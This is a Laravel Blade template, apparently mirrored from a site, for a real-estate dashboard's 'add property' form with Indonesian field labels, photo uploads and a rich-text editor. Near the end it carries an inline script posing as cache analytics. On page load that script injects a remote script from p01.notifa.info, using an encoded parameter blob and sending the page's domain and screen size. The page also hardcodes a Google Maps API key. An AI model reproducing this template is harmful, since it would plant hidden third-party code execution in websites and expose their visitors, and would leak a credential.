<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-add-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:50 GMT -->

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
  <title>Divine Villas - Real Estate HTML Template</title>

  <!-- Bootstrap -->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">

  <!-- External Css -->
  <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
  <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
  <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />

  <!-- leaflet -->
  <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
  <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/css/dropify.min.css">

  <!-- Custom Css -->
  <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

  <!-- Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">

  <!-- Favicon -->
  <link rel="icon" href="{{asset('images/favicon.png')}}">
  <link rel="apple-touch-icon" href="{{asset('images/apple-touch-icon.png')}}">
  <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/icon-72x72.png')}}">
  <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/icon-114x114.png')}}">

  <script src="https://cdn.tiny.cloud/1/no-api-key/tinymce/5/tinymce.min.js" referrerpolicy="origin"></script>
  <script>
    tinymce.init({
      selector: '#mytextarea',
      plugins: [
        "advlist autolink link image lists charmap print preview hr anchor pagebreak spellchecker",
        "searchreplace wordcount visualblocks visualchars code fullscreen insertdatetime media nonbreaking",
        "save table contextmenu directionality emoticons template paste textcolor"
      ],
      toolbar: "insertfile undo redo | styleselect | bold italic | alignleft aligncenter alignright alignjustify | bullist numlist outdent indent | link image | print preview media fullpage | forecolor backcolor emoticons",
    });
  </script>

  <!--[if lt IE 9]>
    <script src="{{asset('assets/js/html5shiv.min.js')}}"></script>
    <script src="{{asset('assets/js/respond.min.js')}}"></script>
    <![endif]-->

</head>

<body>
  @include('layouts.nav')

  <!-- Dashboard -->
  <div class="cp-container section-padding">
    <div class="container-fluid">
      <div class="row">
        <div class="col-md-3">
          @include('layouts.sidebar')
        </div>
        <div class="col-md-9">
          <div class="dashboard-body-block">
            <div class="cpdv-add-listing-container">
              <form action="/agent/properties" method="POST" class="add-listing-form" enctype="multipart/form-data">
                @csrf
                <div class="listing-form-section business-information-container">
                  <h4 class="title">Tambah Properti</h4>
                  <div class="listing-section-body">
                    <div class="row">
                      <div class="col-xs-12">
                        <div class="form-group">
                          <label for="title">Judul</label>
                          <input id="title" name="title" type="text" value="{{old('title')}}" class="form-control">
                        </div>

                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="surface_area">Luas Tanah</label>
                          <input id="surface_area" name="surface_area" type="number" class="form-control" value="{{old('surface_area')}}" placeholder="Dalam satuan meter persegi" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="building_area">Luas Bangunan</label>
                          <input id="building_area" name="building_area" type="number" class="form-control" value="{{old('building_area')}}" placeholder="Dalam satuan meter persegi" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="location">Lokasi</label>
                          <input id="location" name="location" type="text" class="form-control" value="{{old('location')}}" placeholder="" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="direction">Arah hadap</label>
                          <input id="direction" name="direction" type="text" class="form-control" value="{{old('direction')}}" placeholder="Barat,Timur dll" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="bathroom">Kamar Mandi</label>
                          <input id="bathroom" name="bathroom" type="number" class="form-control" value="{{old('bathroom')}}" placeholder="" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="bedroom">Kamar Tidur</label>
                          <input id="bedroom" name="bedroom" type="number" class="form-control" value="{{old('bedroom')}}" placeholder="" aria-required="true">
                        </div>
                      </div>
                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="price">Harga</label>
                          <input id="price" name="price" type="number" class="form-control" value="{{old('price')}}" placeholder="" aria-required="true">
                        </div>
                      </div>
                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="value">Satuan Harga</label>
                          <select id="value" name="value" class="form-control">
                            <option value="JT" {{old('value') == "JT" ? 'selected' : ''}}>Juta</option>
                            <option value="M" {{old('value') == "M" ? 'selected' : ''}}>Miliar</option>
                          </select>
                        </div>
                      </div>

                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="type_id">Tipe Rumah</label>
                          <select id="type_id" name="type_id" class="form-control">
                            @foreach ($types as $type)
                            <option value="{{$type->id}}" {{old('type_id') == $type->id ? 'selected' : ''}}>{{$type->name}}</option>
                            @endforeach
                          </select>
                        </div>
                      </div>

                      <div class="col-sm-6">
                        <div class="form-group">
                          <label for="status_id">Status</label>
                          <select id="status_id" name="status_id" class="form-control">
                            @foreach ($status as $s)
                            <option value="{{$s->id}}" {{old('status_id') == $s->id ? 'selected' : ''}}>{{$s->name}}</option>
                            @endforeach
                          </select>
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="electricity">Listrik</label>
                          <input id="electricity" name="electricity" value="{{old('electricity')}}" type="number" class="form-control" placeholder="Satuan Watt" aria-required="true">
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="water">Sumber Air</label>
                          <input id="water" name="water" type="text" value="{{old('water')}}" class="form-control" placeholder="" aria-required="true">
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="legality">Legalitas</label>
                          <input id="legality" name="legality" value="{{old('legality')}}" type="text" class="form-control" placeholder="" aria-required="true">
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="garage">Garasi</label>
                          <input id="garage" name="garage" value="{{old('garage')}}" type="number" class="form-control" placeholder="" aria-required="true">
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="name">Nama</label>
                          <input id="name" name="name" type="text" value="{{old('name')}}" class="form-control" placeholder="" aria-required="true">
                        </div>
                      </div>

                      <div class="col-lg-6">
                        <div class="form-group">
                          <label for="phone_number">Nomor Handphone Pemilik</label>
                          <input id="phone_number" name="phone_number" type="text" value="{{old('phone_number')}}" class="form-control" placeholder="" aria-required="true">
                        </div>
                      </div>


                      <div class="col-xs-12">
                        <div class="form-group listing-compose-block">
                          <label for="mytextarea">Description</label>
                          <textarea name="description" id="mytextarea" rows="20" class="tinymce-editor">{{old('description')}}</textarea>
                        </div>
                      </div>

                      <div class="col-lg-4">
                        <div class="form-group">
                          <label for="">Foto 1</label>
                          <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
                        </div>
                      </div>
                      <div class="col-lg-4">
                        <div class="form-group">
                          <label for="">Foto 2</label>
                          <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
                        </div>
                      </div>
                      <div class="col-lg-4">
                        <div class="form-group">
                          <label for="">Foto 3</label>
                          <input type="file" name="photo[]" data-max-file-size="2M" class="dropify" />
                        </div>
                      </div>

                    </div>
                  </div>
                  <button type="submit" class="button primary-bg">Tambah</button>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Dashboard End -->

  <!-- Call to Action -->
  <div class="cpdv-container primary-bg section-padding-50">
    <div class="container">
      <div class="row">
        <div class="col-lg-7 col-md-6">
          <div class="left-content">
            <div class="call-to-action-content">
              <h3>Subscribe Today!</h3>
              <p>Don’t miss our future updates. Get Subscribe today to getting Updates!</p>
            </div>
          </div>
        </div>
        <div class="col-lg-5 col-md-6">
          <div class="right-content-sm">
            <div class="call-to-action-form">
              <form class="subscription-form" action="#" method="post">
                <input type="text" placeholder="Enter your mail here">
                <button class="button white-bg">Subscribe</button>
                <p class="newsletter-success"></p>
                <p class="newsletter-error"></p>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!-- Call to Action End -->

  <!-- Footer -->
  <footer>
    <div class="footer-widget-area section-padding">
      <div class="container">
        <div class="row margin-balance">
          <div class="col-md-3 col-sm-6">
            <aside class="widget footer-get-in-touch-widget">
              <h6 class="widget-title">Get in Touch</h6>
              <p><span class="title">Address</span><span class="contact-info">180 Madison Squre <br> New York, NY123545</span></p>
              <p><span class="title">Phone</span><span class="contact-info">+1-254-2564-235</span></p>
              <p><span class="title">Email</span><span class="contact-info">mail@example.com</span></p>
            </aside>
          </div>
          <div class="col-md-3 col-sm-6">
            <aside class="widget footer-listing-widget">
              <h6 class="widget-title">Latest Listings</h6>
              <div class="footer-listings">
                <div class="footer-listing">
                  <div class="listing-thumb">
                    <a href="#">
                      <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                    </a>
                  </div>
                  <div class="body">
                    <p class="title"><a href="#">Hotel in Madison Square</a></p>
                    <p class="cost">$1255.00 / Months</p>
                  </div>
                </div>
                <div class="footer-listing">
                  <div class="listing-thumb">
                    <a href="#">
                      <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                    </a>
                  </div>
                  <div class="body">
                    <p class="title"><a href="#">Hotel in Madison Square</a></p>
                    <p class="cost">$1255.00 / Months</p>
                  </div>
                </div>
              </div>
            </aside>
          </div>
          <div class="col-md-2 col-sm-4">
            <aside class="widget widget-useful-link">
              <h6 class="widget-title">Useful Links</h6>
              <ul class="links">
                <li><a href="#">About Us</a></li>
                <li><a href="#">Recent Listings</a></li>
                <li><a href="#">Featured Listings</a></li>
                <li><a href="#">Our Service</a></li>
              </ul>
            </aside>
          </div>
          <div class="col-md-2 col-sm-4">
            <aside class="widget widget-useful-link">
              <h6 class="widget-title">Buy Information</h6>
              <ul class="links">
                <li><a href="#">How to Purchase</a></li>
                <li><a href="#">Tips &amp; Tricks</a></li>
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Legal / Law</a></li>
              </ul>
            </aside>
          </div>
          <div class="col-md-2 col-sm-4">
            <aside class="widget widget-useful-link">
              <h6 class="widget-title">Sell Information</h6>
              <ul class="links">
                <li><a href="#">How to Purchase</a></li>
                <li><a href="#">Tips &amp; Tricks</a></li>
                <li><a href="#">Privacy Policy</a></li>
                <li><a href="#">Legal / Law</a></li>
              </ul>
            </aside>
          </div>
        </div>
      </div>
    </div>
    <div class="grey-bg section-padding-50">
      <div class="container">
        <div class="row">
          <div class="col-md-4 col-md-offset-4">
            <div class="footer-social-link">
              <div class="footer-logo">
                <a href="#">
                  <img src="{{asset('images/footer-logo.svg')}}" class="img-responsive" alt="Footer Logo">
                </a>
              </div>
              <div class="social-link">
                <ul>
                  <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                  <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                  <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                  <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                  <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="copyright primary-bg">
      <div class="container">
        <div class="row">
          <div class="col-md-6 col-md-push-6">
            <div class="footer-nav" id="footer-nav">
              <ul>
                <li class="submenu">
                  <a href="#">Legal</a>
                  <ul class="submenu-item">
                    <li><a href="#">Dropdown 1</a></li>
                    <li><a href="#">Dropdown 2</a></li>
                    <li><a href="#">Dropdown 3</a></li>
                    <li class="submenu">
                      <a href="#">Dropdown 4</a>
                      <ul class="submenu-item">
                        <li><a href="#">Dropdown 1</a></li>
                        <li><a href="#">Dropdown 2</a></li>
                        <li><a href="#">Dropdown 3</a></li>
                        <li class="submenu">
                          <a href="#">Dropdown 4</a>
                          <ul class="submenu-item">
                            <li><a href="#">Dropdown 1</a></li>
                            <li><a href="#">Dropdown 2</a></li>
                            <li><a href="#">Dropdown 3</a></li>
                            <li class="submenu">
                              <a href="#">Dropdown 4</a>
                              <ul class="submenu-item">
                                <li><a href="#">Dropdown 1</a></li>
                                <li><a href="#">Dropdown 2</a></li>
                                <li><a href="#">Dropdown 3</a></li>
                                <li class="submenu">
                                  <a href="#">Dropdown 4</a>
                                  <ul class="submenu-item">
                                    <li><a href="#">Dropdown 1</a></li>
                                    <li><a href="#">Dropdown 2</a></li>
                                    <li><a href="#">Dropdown 3</a></li>
                                  </ul>
                                </li>
                              </ul>
                            </li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                  </ul>
                </li>
                <li><a href="#">Terms &amp; Conditions </a></li>
                <li><a href="#">Legal</a></li>
                <li><a href="#">Privacy Policy</a></li>
              </ul>
            </div>
          </div>
          <div class="col-md-6 col-md-pull-6">
            <p class="copyright-text">Copyright 2018, <a href="#">Real Estate</a>. All Rights Reserved</p>
          </div>
        </div>
      </div>
    </div>
  </footer>
  <!-- Footer End -->




  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <!-- Include all compiled plugins (below), or include individual files as needed -->
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
  <script src="{{asset('assets/js/visible.js')}}"></script>
  <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
  <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
  <script src="{{asset('assets/js/plyr.js')}}"></script>
  <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
  <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
  <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
  <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
  <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
  <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>

  <!-- leaflet -->
  <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
  <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
  <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>

  <script src="{{asset('js/custom.js')}}"></script>
  <script src="{{asset('js/dashboard.js')}}"></script>
  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
  <script src="{{asset('js/map.js')}}"></script>
  <script src="{{asset('js/searchMap.js')}}"></script>
  <script type="text/javascript">
    if (self == top) {
      function netbro_cache_analytics(fn, callback) {
        setTimeout(function() {
          fn();
          callback();
        }, 0);
      }

      function sync(fn) {
        fn();
      }

      function requestCfs() {
        var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
        var idc_glo_r = Math.floor(Math.random() * 99999999999);
        var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pJDmtm%2bxesmo0ZMegSCb3JUanBtEhdW961ElByTx5MQ7%2fU%2bOg4Fax2kO31n84DP%2fSTsLMgvIn3nLbHhFfmJSOYL0y87kzBB65nkxrkPX9h8TMwxWZbjB0M1nJ8WzSHL%2b6lBfZ9fu5vSJRt02cACRflXTaMdV54%2fV0Pr3T2IdZoluJzo%2bKL%2boyrgs2%2boVAeh5WYOEI1xe%2fnum%2b%2fVLwdWk6Vevxl7gT%2bTZRvK78z6YHTfvF15OEVaMKulwH2d247SGLryumOYnHLbVfqvtKD5pdgTCK8%2bQlj0l%2f38YC%2ftZCtVi0XvuucUfpF%2bjMiAfjfkeqoSvWNPxRXm2QSd04yqnT8Fq8Jiiv6tMexsII%2b%2fw%2fYT3X2waWyGl3d1CDxC4FHecYVjXmPhVznPcZGKbWWbwNO8F4jBGaZvz%2bssmA4XVsaSKe5tGKMzD040yZZfD45CBrGKuesiRL%2fEzcERKKa2ZfZv%2bVNJPnelz1vAmtv8oK%2fzV6u4trWOFVU4Zk9ZpjDS9TQ%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
        var bsa = document.createElement('script');
        bsa.type = 'text/javascript';
        bsa.async = true;
        bsa.src = url;
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
      }
      netbro_cache_analytics(requestCfs, function() {});
    };
  </script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/Dropify/0.2.2/js/dropify.min.js"></script>

  <script>
    $('.dropify').dropify();
  </script>
</body>

<!-- Mirrored from eorrangeshop.com/html/divinevillas/dashboard-add-listing.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:50 GMT -->

</html>